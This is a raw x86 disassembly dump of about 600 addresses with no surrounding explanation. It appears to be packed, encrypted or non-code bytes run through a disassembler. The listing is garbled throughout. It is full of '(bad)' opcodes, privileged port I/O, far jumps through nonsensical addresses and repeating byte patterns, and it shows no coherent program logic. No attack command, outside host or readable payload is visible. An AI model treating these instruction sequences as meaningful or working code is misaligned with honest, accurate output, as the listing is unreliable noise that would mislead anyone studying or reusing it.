  4277cc:	cmp    ch,bh
  4277ce:	xor    BYTE PTR [edi+0x3e],0xec
  4277d2:	ja     0x42775a
  4277d4:	push   eax
  4277d5:	ja     0x42775d
  4277d7:	xor    BYTE PTR [edi-0x75],0x80
  4277db:	lock mov edx,DWORD PTR [ebx+0x11]
  4277df:	mov    dl,0xba
  4277e1:	sub    DWORD PTR [ebx+0x7c],edx
  4277e4:	mov    dl,0x86
  4277e6:	or     al,0xff
  4277e8:	mov    dl,0x80
  4277ea:	lock xchg BYTE PTR [ecx],cl
  4277ed:	and    dh,BYTE PTR [edx-0x7f750f80]
  4277f3:	xchg   edi,eax
  4277f4:	mov    dl,BYTE PTR [ebx+0x2a]
  4277f7:	push   ebx
  4277f8:	xchg   esp,eax
  4277f9:	mov    dl,0xbe
  4277fb:	or     al,0xb2
  4277fd:	clc    
  4277fe:	sub    edi,edi
  427800:	(bad)  
  427801:	in     al,dx
  427802:	lock mul DWORD PTR [ebx-0x4e]
  427806:	or     edx,ebp
  427808:	hlt    
  427809:	retf   
  42780a:	dec    ebp
  42780b:	dec    ebp
  42780c:	xor    BYTE PTR [edi-0x11],0xab
  427810:	test   eax,0x71fb70a3
  427815:	lea    edx,[edi-0x78127880]
  42781b:	adc    eax,0x539b9993
  427820:	push   0xffffff80
  427822:	ja     0x427859
  427824:	or     ch,0x2e
  427827:	cmp    cl,BYTE PTR [ebp-0x10687f73]
  42782d:	or     BYTE PTR [ebp-0x7fde2880],0xe7
  427834:	out    dx,eax
  427835:	and    BYTE PTR [edi-0x7588afdf],0x60
  42783c:	fistp  DWORD PTR [eax-0x21]
  42783f:	adc    DWORD PTR [ebx-0x4a],edx
  427842:	pop    esi
  427843:	xchg   BYTE PTR [edi+0x32532643],cl
  427849:	or     DWORD PTR [esi-0x3e],eax
  42784c:	or     al,0xb2
  42784e:	mov    esp,0x8d4ba229
  427853:	lea    ecx,[ebp+0xc88b2cd]
  427859:	push   ebx
  42785a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42785b:	dec    DWORD PTR [ebx-0x80]
  42785e:	out    0x1d,eax
  427860:	call   DWORD PTR [ebx+eiz*2+0x6313d79c]
  427867:	(bad)  
  427868:	xlat   BYTE PTR ds:[ebx]
  427869:	or     DWORD PTR [edx-0x54881f31],esp
  42786f:	push   esi
  427870:	sar    ebx,cl
  427872:	adc    al,0x62
  427874:	mov    esi,0x8d8d3a9c
  427879:	adc    BYTE PTR [edi+0x15d78071],0x80
  427880:	xchg   edi,eax
  427881:	out    dx,eax
  427882:	adc    bh,0x21
  427885:	adc    BYTE PTR [edi+0x21d780ef],0x80
  42788c:	out    0xef,eax
  42788e:	and    BYTE PTR [edi+0x53325321],0xb6
  427895:	or     DWORD PTR [esi-0x3e],eax
  427898:	or     al,0xb2
  42789a:	mov    esp,0x8d4ba229
  42789f:	lea    ecx,[ebp-0x5bac33]
  4278a5:	xchg   esp,eax
  4278a6:	mov    dl,0x88
  4278a8:	or     al,0xff
  4278aa:	dec    ebx
  4278ab:	and    bh,0x71
  4278ae:	and    BYTE PTR [edi-0x7f7daceb],0x77
  4278b5:	jno    0x42790a
  4278b7:	retf   
  4278b8:	xor    al,0x15
  4278bb:	or     DWORD PTR [esi-0x54],eax
  4278be:	or     al,0xb2
  4278c0:	test   BYTE PTR [ecx],ch
  4278c2:	push   ebx
  4278c3:	jo     0x4278c4
  4278c5:	retf   
  4278c6:	push   edi
  4278c7:	lea    ecx,[ebp-0x3b4d3273]
  4278cd:	or     al,0xff
  4278cf:	add    BYTE PTR [eax-0x63131089],0x13
  4278d6:	mov    BYTE PTR [eax+0x21d78051],0x80
  4278dd:	out    0x71,eax
  4278df:	and    BYTE PTR [edi-0x757b12eb],0xed
  4278e6:	mov    esp,0x29beb28a
  4278eb:	push   ebx
  4278ec:	jb     0x427945
  4278ee:	aad    0x58
  4278f0:	fist   WORD PTR [ecx]
  4278f2:	mov    ds:0x438f860b,al
  4278f7:	mov    es:0xdf58d54b,al
  4278fd:	adc    DWORD PTR [edx+0x438f86c6],esp
  427903:	es in  al,dx
  427905:	jl     0x42791a
  427907:	(bad)  
  427908:	(bad)  
  427909:	std    
  42790a:	(bad)  
  42790b:	jle    0x42796b
  42790d:	xchg   BYTE PTR [edi+0x5a22643],cl
  427913:	fstp   DWORD PTR [eax-0x21]
  427916:	adc    DWORD PTR [ebx-0x9],edx
  427919:	mov    ds:0xdf58e8cb,al
  42791e:	adc    edi,edx
  427920:	adc    esp,DWORD PTR [ebx-0x9]
  427923:	xlat   BYTE PTR ds:[ebx]
  427924:	or     DWORD PTR [edx+0x3ca10d57],esp
  42792a:	(bad)  
  42792c:	loope  0x427942
  42792e:	enter  0x25be,0x3a
  427932:	lea    ecx,[ebp-0x7f106880]
  427938:	xlat   BYTE PTR ds:[ebx]
  427939:	and    DWORD PTR [eax-0x187f1059],eax
  42793f:	and    DWORD PTR [ebx+0x32],edx
  427942:	pusha  
  427943:	fistp  DWORD PTR [eax-0x21]
  427946:	adc    DWORD PTR [ebx-0x4a],edx
  427949:	or     DWORD PTR [esi-0x3e],eax
  42794c:	or     al,0xb2
  42794e:	mov    BYTE PTR [ebx+edx*2],cl
  427951:	dec    ebp
  427952:	mov    dl,0xb4
  427954:	sub    DWORD PTR [eax-0x29],edx
  427957:	enter  0x9cff,0x80
  42795b:	out    0xc8,eax
  42795d:	cli    
  42795e:	lea    ecx,[ebp+0x453cd8d]
  427964:	inc    DWORD PTR [esi]
  427966:	and    BYTE PTR [edi+0x50238025],0xa7
  42796d:	xor    ah,BYTE PTR [ebx+0x3]
  427970:	xlat   BYTE PTR ds:[ebx]
  427971:	outs   dx,DWORD PTR ds:[esi]
  427972:	push   ebx
  427973:	jb     0x4279d8
  427975:	pushf  
  427976:	aad    0xb0
  427978:	dec    ebp
  427979:	xlat   BYTE PTR ds:[ebx]
  42797a:	xor    eax,0x4d25d780
  42797f:	xlat   BYTE PTR ds:[ebx]
  427980:	sub    eax,0x4d8ad74d
  427985:	pop    ecx
  427986:	xchg   BYTE PTR [ebx],dh
  427988:	dec    ebx
  427989:	dec    ebp
  42798a:	dec    ebp
  42798b:	push   eax
  42798c:	outs   dx,DWORD PTR ds:[esi]
  42798d:	mov    esi,0x8d8d8dfa
  427992:	adc    BYTE PTR [edi+0x21e780ef],0x53
  427999:	mov    edx,DWORD PTR [ebx-0x4a]
  42799c:	or     DWORD PTR [esi-0x7b],eax
  42799f:	or     al,0xb2
  4279a1:	popa   
  4279a2:	or     al,0x50
  4279a4:	out    0xc8,eax
  4279a6:	and    bh,0xef
  4279a9:	and    BYTE PTR [edi+0x29bcb221],0x53
  4279b0:	or     eax,0x53c8d780
  4279b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279b6:	dec    DWORD PTR [ebx-0x80]
  4279b9:	out    0x71,eax
  4279bb:	push   ebx
  4279bc:	retf   
  4279bd:	call   DWORD PTR [eax+eax*4-0x7dacea59]
  4279c4:	cmp    BYTE PTR [eax+eax*4-0x19],0x71
  4279c9:	adc    BYTE PTR [ecx],0x80
  4279cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279cd:	adc    eax,0xcfd4609
  4279d2:	mov    dl,0xbc
  4279d4:	sub    DWORD PTR [ebx-0x5c],edx
  4279d7:	mov    dl,0xbe
  4279d9:	or     al,0xa2
  4279db:	dec    ebx
  4279dc:	lea    ecx,[ebp+0x74ffcd8d]
  4279e2:	jmp    FWORD PTR [edx]
  4279e4:	arpl   di,si
  4279e6:	xlat   BYTE PTR ds:[ebx]
  4279e7:	sbb    DWORD PTR [ebx+0x5],esp
  4279ea:	xlat   BYTE PTR ds:[ebx]
  4279eb:	nop
  4279ec:	dec    edx
  4279ed:	push   ebx
  4279ee:	test   DWORD PTR [esi],ebx
  4279f0:	jne    0x4279b1
  4279f2:	push   0xffffffc8
  4279f4:	outs   dx,DWORD PTR ds:[esi]
  4279f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279f6:	jbe    0x427a2c
  4279f8:	push   ebx
  4279f9:	test   DWORD PTR [esi],ebx
  4279fb:	jne    0x4279c1
  4279fd:	stos   BYTE PTR es:[edi],al
  4279fe:	xor    BYTE PTR [edi-0x11],0x80
  427a02:	lock and DWORD PTR [eax-0x287f1069],eax
  427a09:	and    DWORD PTR [edx+0x438f8605],esp
  427a0f:	es push edi
  427a11:	fistp  DWORD PTR [eax-0x21]
  427a14:	adc    DWORD PTR [ecx],ecx
  427a16:	inc    esi
  427a17:	std    
  427a18:	or     al,0x80
  427a1a:	ret    0x4d53
  427a1d:	push   ebx
  427a1e:	jb     0x4279d2
  427a20:	add    ch,BYTE PTR [ecx]
  427a22:	push   ebx
  427a23:	test   DWORD PTR [edx+0xba20cbe],esi
  427a29:	lea    ecx,[ebp+0x7cffcd8d]
  427a2f:	call   DWORD PTR [ecx+0x5f]
  427a32:	ja     0x4279be
  427a34:	xlat   BYTE PTR ds:[ebx]
  427a35:	out    dx,al
  427a36:	arpl   WORD PTR [esi+0x47a221d5],si
  427a3c:	fisubr WORD PTR [eax+0x2d]
  427a3f:	mov    ds:0xe3bb390a,al
  427a44:	les    esp,FWORD PTR [esi-0x5e2bc85e]
  427a4a:	adc    edx,ebp
  427a4c:	pop    esp
  427a4d:	js     0x427a73
  427a4f:	xor    ch,BYTE PTR [ebx-0x48f5c57]
  427a55:	sub    eax,0x8780978d
  427a5a:	in     eax,dx
  427a5b:	xchg   DWORD PTR [ecx],esp
  427a5d:	xor    BYTE PTR [edi-0x11],0x80
  427a61:	lock and DWORD PTR [ecx],ecx
  427a64:	inc    esi
  427a65:	std    
  427a66:	or     al,0xb2
  427a68:	mov    esi,0xeff0800c
  427a6d:	adc    BYTE PTR [edi-0x454d66df],0x29
  427a74:	xor    al,0x1d
  427a77:	cli    
  427a78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a79:	mov    DWORD PTR [esp+edx*8],0x7253fc53
  427a80:	(bad)  
  427a81:	sti    
  427a82:	push   eax
  427a83:	cmp    al,BYTE PTR [eax-0x327fda89]
  427a89:	cmp    cl,BYTE PTR ss:[ebp-0x7f107f73]
  427a90:	ja     0x427ab7
  427a92:	or     ch,0x36
  427a95:	cmp    cl,BYTE PTR [ebp-0x13727f73]
  427a9b:	xchg   edx,eax
  427a9c:	gs xor al,0x25
  427aa0:	adc    BYTE PTR [eax+0x32],0x3a
  427aa4:	lea    ecx,[ebp-0x1dea8080]
  427aaa:	out    dx,al
  427aab:	mov    ebp,0x8d8d818d
  427ab0:	dec    ebp
  427ab1:	push   edx
  427ab2:	or     ch,BYTE PTR [edx-0x73af49b3]
  427ab8:	xor    BYTE PTR [edi-0x11],0x80
  427abc:	lock and DWORD PTR [ecx],ecx
  427abf:	inc    esi
  427ac0:	std    
  427ac1:	or     al,0xb2
  427ac3:	mov    esi,0xeff0800c
  427ac8:	adc    BYTE PTR [edi+0x25d74d21],0x53
  427acf:	cld    
  427ad0:	push   ebx
  427ad1:	jb     0x427ad2
  427ad3:	sti    
  427ad4:	push   eax
  427ad5:	ja     0x427a61
  427ad7:	add    DWORD PTR [edi-0x76],esi
  427ada:	or     bl,BYTE PTR [ebx-0x4de228b3]
  427ae0:	mov    edx,0x15d74d29
  427ae5:	dec    ebp
  427ae6:	xlat   BYTE PTR ds:[ebx]
  427ae7:	jno    0x427b36
  427ae9:	xlat   BYTE PTR ds:[ebx]
  427aea:	and    DWORD PTR [ebp-0x29],ecx
  427aed:	out    dx,eax
  427aee:	xchg   BYTE PTR [ebx],dh
  427af0:	int3   
  427af1:	dec    ebp
  427af2:	dec    ebp
  427af3:	xor    BYTE PTR [edi-0x11],0x80
  427af7:	lock and DWORD PTR [ecx],ecx
  427afa:	inc    esi
  427afb:	std    
  427afc:	or     al,0xb2
  427afe:	mov    esi,0xeff0800c
  427b03:	adc    BYTE PTR [edi+0x53fc5321],0x72
  427b0a:	mov    dl,0xba
  427b0c:	sub    DWORD PTR [eax+0x63fbff09],eax
  427b12:	std    
  427b13:	aad    0x37
  427b15:	xor    BYTE PTR [edi+0x71],0x80
  427b19:	lock adc eax,0xcfd4609
  427b1f:	mov    dl,0xbe
  427b21:	or     al,0x80
  427b23:	lock jno 0x427aa6
  427b26:	xchg   edi,eax
  427b27:	adc    eax,0x7253fc53
  427b2c:	mov    dl,0xba
  427b2e:	sub    DWORD PTR [eax-0x400e210],eax
  427b34:	or     DWORD PTR [edx],esp
  427b36:	ja     0x427ac2
  427b38:	push   eax
  427b39:	cmp    ch,BYTE PTR [ecx-0x72e20490]
  427b3f:	xchg   edi,eax
  427b40:	add    BYTE PTR [edi-0x64666c6a],0x53
  427b47:	push   0xffffff80
  427b49:	xlat   BYTE PTR ds:[ebx]
  427b4a:	cmp    eax,0x80459780
  427b4f:	out    0x25,eax
  427b51:	pop    esi
  427b52:	xchg   BYTE PTR [edi-0x249fd9bd],cl
  427b58:	pop    eax
  427b59:	fist   WORD PTR [ecx]
  427b5b:	arpl   di,si
  427b5d:	or     esi,ecx
  427b5f:	dec    esp
  427b60:	lea    ecx,[ebp-0x3960fe73]
  427b66:	in     al,0xee
  427b68:	arpl   si,ax
  427b6a:	(bad)  
  427b6c:	arpl   si,ax
  427b6e:	xlat   BYTE PTR ds:[ebx]
  427b6f:	out    dx,eax
  427b70:	arpl   di,si
  427b72:	or     DWORD PTR [edi],ecx
  427b74:	pop    ss
  427b75:	or     al,0x8d
  427b77:	lea    esp,[edx-0x20a755f3]
  427b7d:	adc    edi,edx
  427b7f:	out    dx,eax
  427b80:	arpl   di,si
  427b82:	or     DWORD PTR [edi],ecx
  427b84:	das    
  427b85:	or     al,0x8d
  427b87:	lea    esp,[edx-0x20a766f3]
  427b8d:	adc    edi,edx
  427b8f:	out    dx,eax
  427b90:	arpl   di,si
  427b92:	or     DWORD PTR [edi],ecx
  427b94:	dec    ebx
  427b95:	lea    ecx,[ebp-0x56f25d73]
  427b9b:	pop    eax
  427b9c:	fist   WORD PTR [ecx]
  427b9e:	xlat   BYTE PTR ds:[ebx]
  427b9f:	out    dx,al
  427ba0:	arpl   di,si
  427ba2:	aad    0x3f
  427ba4:	mov    ds:0xdf58d00d,al
  427ba9:	adc    edi,edx
  427bab:	out    dx,eax
  427bac:	arpl   di,si
  427bae:	or     DWORD PTR [edi],ecx
  427bb0:	mov    al,ds:0xa28d8d3a
  427bb5:	or     eax,0x11df58b9
  427bba:	or     DWORD PTR [edi-0x24],ecx
  427bbd:	cmp    cl,BYTE PTR [ebp+0x9f7638d]
  427bc3:	(bad)  
  427bc5:	lea    ecx,[ebp+0x3aa2be8d]
  427bcb:	lea    ecx,[ebp+0x4d1dd74d]
  427bd1:	xlat   BYTE PTR ds:[ebx]
  427bd2:	sub    eax,0x4d15d74d
  427bd7:	xlat   BYTE PTR ds:[ebx]
  427bd8:	jno    0x427c27
  427bda:	xlat   BYTE PTR ds:[ebx]
  427bdb:	and    DWORD PTR [ebp-0x29],ecx
  427bde:	out    dx,eax
  427bdf:	xchg   bl,dl
  427be1:	or     eax,0xb7be4d4d
  427be6:	cmp    cl,BYTE PTR [ebp-0x3ef25d73]
  427bec:	pop    eax
  427bed:	fist   WORD PTR [ecx]
  427bef:	xlat   BYTE PTR ds:[ebx]
  427bf0:	out    dx,eax
  427bf1:	arpl   di,si
  427bf3:	or     DWORD PTR [edi],ecx
  427bf5:	loope  0x427b84
  427bf7:	lea    ecx,[ebp+0x58e40da2]
  427bfd:	fist   WORD PTR [ecx]
  427bff:	xlat   BYTE PTR ds:[ebx]
  427c00:	out    dx,eax
  427c01:	arpl   di,si
  427c03:	or     DWORD PTR [edi],ecx
  427c05:	mov    cl,0x3a
  427c07:	lea    ecx,[ebp+0x58d90da2]
  427c0d:	fist   WORD PTR [ecx]
  427c0f:	xlat   BYTE PTR ds:[ebx]
  427c10:	out    dx,al
  427c11:	arpl   di,si
  427c13:	aad    0x1d
  427c15:	mov    ds:0xdf58e60d,al
  427c1a:	adc    edi,edx
  427c1c:	out    dx,eax
  427c1d:	arpl   di,si
  427c1f:	or     DWORD PTR [edi],ecx
  427c21:	aam    0x3a
  427c23:	lea    ecx,[ebp+0x58e80da2]
  427c29:	fist   WORD PTR [ecx]
  427c2b:	les    eax,FWORD PTR [ecx]
  427c2d:	adc    BYTE PTR [edi+0x21d780ef],0x80
  427c34:	out    0xef,eax
  427c36:	and    BYTE PTR [edi+0x53325321],0xb6
  427c3d:	or     DWORD PTR [esi-0x3e],eax
  427c40:	or     al,0xb2
  427c42:	mov    esp,0x8d4ba229
  427c47:	lea    ecx,[ebp+0xc88b2cd]
  427c4d:	push   ebx
  427c4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c4f:	dec    DWORD PTR [ebx-0x80]
  427c52:	out    0xef,eax
  427c54:	call   DWORD PTR [eax+eax*4-0x6313de59]
  427c5b:	adc    eax,esi
  427c5d:	push   eax
  427c5e:	xchg   edi,eax
  427c5f:	out    dx,eax
  427c60:	push   eax
  427c61:	xlat   BYTE PTR ds:[ebx]
  427c62:	and    DWORD PTR [eax-0x287f1069],eax
  427c68:	and    DWORD PTR [eax-0x587f1019],eax
  427c6e:	and    DWORD PTR [ebx+0x32],edx
  427c71:	push   ebx
  427c72:	mov    dh,0x9
  427c74:	inc    esi
  427c75:	ret    0xb20c
  427c78:	mov    esp,0xb2a45329
  427c7d:	mov    BYTE PTR [edx+eiz*4],cl
  427c80:	dec    ebx
  427c81:	lea    ecx,[ebp-0x6b003273]
  427c87:	dec    DWORD PTR [ebx+0x3f]
  427c8a:	xchg   edi,eax
  427c8b:	jno    0x427cac
  427c8d:	xlat   BYTE PTR ds:[ebx]
  427c8e:	adc    eax,0x803d9780
  427c93:	xlat   BYTE PTR ds:[ebx]
  427c94:	inc    ebp
  427c95:	adc    BYTE PTR [edi+0x15d78071],0x80
  427c9c:	xchg   edi,eax
  427c9d:	jno    0x427c1f
  427c9f:	xlat   BYTE PTR ds:[ebx]
  427ca0:	adc    eax,0x8071e780
  427ca5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ca6:	adc    eax,0xb6533253
  427cab:	or     DWORD PTR [esi-0x3e],eax
  427cae:	or     al,0xb2
  427cb0:	mov    esp,0xa2a45329
  427cb5:	dec    ebx
  427cb6:	lea    ecx,[ebp-0x774d3273]
  427cbc:	or     al,0xff
  427cbe:	dec    ebx
  427cbf:	and    bh,0x3d
  427cc2:	call   DWORD PTR [eax+eax*4-0x34acba59]
  427cc9:	push   ebx
  427cca:	add    BYTE PTR [eax-0xf7fc289],0x45
  427cd1:	or     DWORD PTR [esi-0x54],eax
  427cd4:	or     al,0x53
  427cd6:	jo     0x427c8a
  427cd8:	test   BYTE PTR [ecx],ch
  427cda:	push   edi
  427cdb:	lea    ecx,[ebp-0x34003273]
  427ce1:	xor    al,0x71
  427ce4:	mov    dl,0xc4
  427ce6:	or     al,0xff
  427ce8:	sub    ah,0x9c
  427ceb:	adc    BYTE PTR [edi-0x1239eceb],0xba
  427cf2:	mov    dh,BYTE PTR [edx+0x6a532988]
  427cf8:	mov    ds:0xdf58d505,al
  427cfd:	adc    DWORD PTR [edx+0x438f86c2],esp
  427d03:	es and bh,0x3d
  427d07:	and    BYTE PTR [edi-0x754312bb],0xa2
  427d0e:	dec    ebx
  427d0f:	aad    0x58
  427d11:	fist   WORD PTR [ecx]
  427d13:	mov    ds:0x438f86c6,al
  427d18:	es in  al,dx
  427d1a:	sub    al,BYTE PTR [eax-0x6becda19]
  427d20:	(bad)  
  427d21:	sti    
  427d22:	push   edi
  427d23:	xchg   BYTE PTR [edi-0xf5d9bd],cl
  427d29:	add    eax,0x58d90ba2
  427d2e:	fist   WORD PTR [ecx]
  427d30:	cdq    
  427d31:	dec    ebp
  427d32:	xlat   BYTE PTR ds:[ebx]
  427d33:	xor    eax,0x9b2dd74d
  427d38:	dec    ebp
  427d39:	xlat   BYTE PTR ds:[ebx]
  427d3a:	sbb    eax,0x4d15d74d
  427d3f:	xlat   BYTE PTR ds:[ebx]
  427d40:	jno    0x427d8f
  427d42:	xlat   BYTE PTR ds:[ebx]
  427d43:	and    DWORD PTR [ebp-0x29],ecx
  427d46:	out    dx,eax
  427d47:	xchg   dh,al
  427d49:	int3   
  427d4a:	dec    ebp
  427d4b:	dec    ebp
  427d4c:	push   eax
  427d4d:	mov    WORD PTR [eax-0x5c565474],es
  427d53:	jo     0x427d50
  427d55:	cmp    eax,0xef97808d
  427d5a:	adc    bh,0x21
  427d5d:	and    bh,0xef
  427d60:	and    BYTE PTR [edi+0x53b65321],0x32
  427d67:	or     DWORD PTR [esi-0x3e],eax
  427d6a:	or     al,0xb2
  427d6c:	mov    esp,0x8d4ba229
  427d71:	lea    ecx,[ebp+0xc88b2cd]
  427d77:	push   ebx
  427d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d79:	call   DWORD PTR [edi+edi*8+0x71e7804b]
  427d80:	and    BYTE PTR [edi-0x6300eb],0xc6
  427d87:	push   eax
  427d88:	xchg   edi,eax
  427d89:	jno    0x427ddb
  427d8b:	xlat   BYTE PTR ds:[ebx]
  427d8c:	adc    eax,0x803d9780
  427d91:	xlat   BYTE PTR ds:[ebx]
  427d92:	inc    ebp
  427d93:	adc    BYTE PTR [edi+0x15d78071],0x80
  427d9a:	xchg   edi,eax
  427d9b:	out    dx,eax
  427d9c:	adc    bh,0x21
  427d9f:	adc    BYTE PTR [edi+0x21d780ef],0x80
  427da6:	out    0xef,eax
  427da8:	and    BYTE PTR [edi+0x53b65321],0x32
  427daf:	or     DWORD PTR [esi-0x3e],eax
  427db2:	or     al,0xb2
  427db4:	mov    esp,0x8d4ba229
  427db9:	lea    ecx,[ebp-0x5bac33]
  427dbf:	xchg   esp,eax
  427dc0:	mov    dl,0x88
  427dc2:	or     al,0xff
  427dc4:	dec    ebx
  427dc5:	and    bh,0x71
  427dc8:	and    BYTE PTR [edi+0x53cb5315],0x82
  427dcf:	xor    BYTE PTR [edi+0x71],0x80
  427dd3:	lock adc eax,0xcac4609
  427dd9:	push   ebx
  427dda:	jo     0x427ddb
  427ddc:	retf   
  427ddd:	mov    dl,0x84
  427ddf:	sub    DWORD PTR [edi-0x73],edx
  427de2:	lea    ecx,[ebp+0xcc4b2cd]
  427de8:	inc    DWORD PTR [edx-0x7fc28880]
  427dee:	lock inc ebp
  427df0:	in     al,dx
  427df1:	pushf  
  427df2:	and    bh,0x3d
  427df5:	adc    eax,esi
  427df7:	and    BYTE PTR [edi-0x79fa5dbb],0x8f
  427dfe:	inc    ebx
  427dff:	es push edi
  427e01:	fistp  DWORD PTR [eax-0x21]
  427e04:	adc    DWORD PTR [ecx],ecx
  427e06:	inc    esi
  427e07:	std    
  427e08:	or     al,0xb2
  427e0a:	mov    esp,0xcbeb229
  427e0f:	push   ebx
  427e10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e11:	mov    ds:0x8d8d8d4b,al
  427e16:	int    0xff
  427e18:	sub    bh,bh
  427e1a:	je     0x427e08
  427e1c:	not    DWORD PTR [ebx]
  427e1e:	add    eax,0x80eff080
  427e23:	xchg   edi,eax
  427e24:	and    DWORD PTR [eax-0x587f8e19],eax
  427e2a:	adc    eax,0xed8abaed
  427e2f:	mov    esp,0xd505a28a
  427e34:	pop    eax
  427e35:	fist   WORD PTR [ecx]
  427e37:	mov    ds:0xdf58d54b,al
  427e3c:	adc    DWORD PTR [edx+0x6a532988],esi
  427e42:	mov    ds:0x438f86c2,al
  427e47:	mov    es:0x438f86c6,al
  427e4d:	es in  al,dx
  427e4f:	sub    dl,BYTE PTR [ebx]
  427e51:	xchg   esp,eax
  427e52:	mov    esi,0x4d4d0d48
  427e57:	xchg   edi,eax
  427e58:	add    BYTE PTR [edi-0x66e27813],0x60
  427e5f:	fstp   DWORD PTR [eax-0x21]
  427e62:	adc    DWORD PTR [eax-0x10],edx
  427e65:	xor    bl,BYTE PTR [esi-0x7a]
  427e68:	pop    DWORD PTR [ebx+0x26]
  427e6b:	push   eax
  427e6c:	ja     0x427e36
  427e6e:	jl     0x427ee7
  427e70:	xchg   ah,ah
  427e72:	pop    eax
  427e73:	fist   WORD PTR [ecx]
  427e75:	push   eax
  427e76:	ja     0x427dff
  427e78:	adc    BYTE PTR [edi-0x37287fce],0x9b
  427e7f:	or     DWORD PTR [esi-0x3e],eax
  427e82:	or     al,0xb2
  427e84:	mov    BYTE PTR [eax+eax*4],cl
  427e87:	xlat   BYTE PTR ds:[ebx]
  427e88:	xor    al,BYTE PTR [eax-0x5df53719]
  427e8e:	ret    0xc7a7
  427e91:	add    al,0xd4
  427e93:	push   ebx
  427e94:	dec    ebp
  427e95:	xchg   esi,eax
  427e96:	call   FWORD PTR [eax+edx*2-0x687f7569]
  427e9d:	and    DWORD PTR [eax-0x69],edx
  427ea0:	and    DWORD PTR [ebp-0x29],ecx
  427ea3:	and    DWORD PTR [ecx],eax
  427ea5:	ja     0x427e31
  427ea7:	dec    ebp
  427ea8:	xlat   BYTE PTR ds:[ebx]
  427ea9:	out    dx,eax
  427eaa:	mov    dl,0x2
  427eac:	sub    DWORD PTR [edx],ecx
  427eae:	dec    ebp
  427eaf:	xlat   BYTE PTR ds:[ebx]
  427eb0:	and    DWORD PTR [ebp-0x29],ecx
  427eb3:	xchg   DWORD PTR [ebp-0x29],ecx
  427eb6:	xchg   BYTE PTR [ebp-0x29],cl
  427eb9:	enter  0xd74d,0x32
  427ebd:	xchg   bh,ah
  427ebf:	mov    cl,BYTE PTR [ebp+0x4d]
  427ec2:	stos   DWORD PTR es:[edi],eax
  427ec3:	push   eax
  427ec4:	ja     0x427e50
  427ec6:	xor    BYTE PTR [edi-0x76],0xa9
  427eca:	jo     0x427ec7
  427ecc:	out    dx,eax
  427ecd:	lea    edx,[edi-0x6127880]
  427ed3:	mov    ebp,ebp
  427ed5:	xchg   DWORD PTR [ebp-0x67],eax
  427ed8:	jl     0x427f4f
  427eda:	xor    eax,0x8d8d8d35
  427edf:	lea    edi,[ebp+esi*2+0x35]
  427ee3:	inc    ebp
  427ee4:	lea    ecx,[ebp+0x75018d8d]
  427eea:	xor    eax,0xd74d0a71
  427eef:	xor    eax,0x4d2dd74d
  427ef4:	xlat   BYTE PTR ds:[ebx]
  427ef5:	and    eax,0x4d1dd74d
  427efa:	xlat   BYTE PTR ds:[ebx]
  427efb:	adc    eax,0x4d71d74d
  427f00:	xlat   BYTE PTR ds:[ebx]
  427f01:	and    DWORD PTR [ebp-0x29],ecx
  427f04:	out    dx,eax
  427f05:	xchg   cl,bl
  427f07:	mov    eax,0x77804d4d
  427f0c:	out    dx,eax
  427f0d:	push   eax
  427f0e:	jne    0x427f45
  427f10:	out    dx,al
  427f11:	xor    BYTE PTR [ebp+0x35],0x35
  427f15:	dec    edi
  427f16:	push   0x9
  427f18:	prefetcht0 BYTE PTR [ebp+0x75808d8d]
  427f1f:	xor    eax,0x96a4f45
  427f24:	(bad)  
  427f26:	lea    ecx,[ebp+0x35d54d8d]
  427f2c:	and    eax,0x2535d54d
  427f31:	dec    ebp
  427f32:	aad    0x35
  427f34:	and    eax,0x81357580
  427f39:	dec    ebp
  427f3a:	test   DWORD PTR [eax-0x7f11ca8b],0x80ee3575
  427f44:	jne    0x427f7b
  427f46:	out    dx,al
  427f47:	add    DWORD PTR [edi-0x12],esi
  427f4a:	push   eax
  427f4b:	jne    0x427f82
  427f4d:	out    dx,eax
  427f4e:	xor    BYTE PTR [ebp+0x35],0x3d
  427f52:	in     al,dx
  427f53:	jne    0x427f8a
  427f55:	out    dx,al
  427f56:	push   eax
  427f57:	jne    0x427f8e
  427f59:	out    dx,al
  427f5a:	xor    BYTE PTR [ebp+0x35],0xee
  427f5e:	xor    BYTE PTR [ebp+0x35],0xee
  427f62:	xor    BYTE PTR [ecx],0x35
  427f65:	out    dx,al
  427f66:	adc    BYTE PTR [eax+0x26],0x3a
  427f6a:	lea    ecx,[ebp-0x2a7ff180]
  427f70:	xor    eax,0x2ecd80ef
  427f75:	cmp    cl,BYTE PTR [ebp+0x9195f8d]
  427f7b:	jmp    0x7180:0x8d8d3a16
  427f82:	add    BYTE PTR [ecx+0x165aa80],0x95
  427f89:	sbb    DWORD PTR [edx],ecx
  427f8b:	sub    BYTE PTR [esi-0x80],0x90
  427f8f:	in     al,dx
  427f90:	jle    0x427f12
  427f92:	aad    0x35
  427f94:	out    dx,eax
  427f95:	pop    edi
  427f96:	sbb    DWORD PTR [ecx],ecx
  427f98:	in     eax,dx
  427f99:	fstp   TBYTE PTR [edx]
  427f9b:	lea    ecx,[ebp-0x10ca6a80]
  427fa1:	sub    BYTE PTR [esi-0x80],0xa6
  427fa5:	or     BYTE PTR [ebp-0x4d13aebd],0x50
  427fac:	or     al,0xbe
  427fae:	sar    BYTE PTR [edx],1
  427fb0:	lea    ecx,[ebp+0x45357580]
  427fb6:	dec    edi
  427fb7:	push   0x9
  427fb9:	dec    edi
  427fba:	cdq    
  427fbb:	cmp    cl,BYTE PTR [ebp+0x3575808d]
  427fc1:	out    dx,al
  427fc2:	or     ch,0x2e
  427fc5:	cmp    cl,BYTE PTR [ebp+0x508d808d]
  427fcb:	jne    0x428002
  427fcd:	and    DWORD PTR [eax-0x7f11ca8b],eax
  427fd3:	int    0x26
  427fd5:	cmp    cl,BYTE PTR [ebp+0x508d808d]
  427fdb:	jne    0x428012
  427fdd:	and    DWORD PTR [eax-0x7f11ca8b],eax
  427fe3:	int    0x10
  427fe5:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  427feb:	lea    edx,[eax+0x75]
  427fee:	xor    eax,0x35758021
  427ff3:	out    dx,al
  427ff4:	or     ch,0x41
